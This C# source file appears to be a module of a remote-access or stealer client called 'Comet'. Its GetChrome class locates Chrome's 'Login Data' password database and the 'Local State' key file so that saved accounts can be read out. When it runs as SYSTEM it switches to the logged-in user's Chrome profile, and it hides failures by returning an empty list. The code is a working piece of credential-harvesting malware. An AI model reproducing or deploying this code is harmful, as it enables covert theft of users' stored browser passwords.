using Comet.Common.Models;
using System;
using System.Collections.Generic;
using System.IO;

namespace Comet.Client.Recovery.Browsers
{
    public class GetChrome : ChromiumBase
    {
        /// <inheritdoc />
        public override string ApplicationName => "Chrome";

        /// <inheritdoc />
        public override IEnumerable<SaveUser> ReadAccounts()
        {
            try
            {
                string filePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "Google\\Chrome\\User Data\\Default\\Login Data");
                string localStatePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "Google\\Chrome\\User Data\\Local State");
                
                if (filePath.Contains("systemprofile"))
                {
                    filePath = "C:\\Users\\" + ToolsHelpers.GetExplorerUserName() + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data";
                    localStatePath = "C:\\Users\\" + ToolsHelpers.GetExplorerUserName() + "\\AppData\\Local\\Google\\Chrome\\User Data\\Local State";
                }
                return ReadAccounts(filePath, localStatePath);
            }
            catch (Exception)
            {
                return new List<SaveUser>();
            }
        }
    }
}
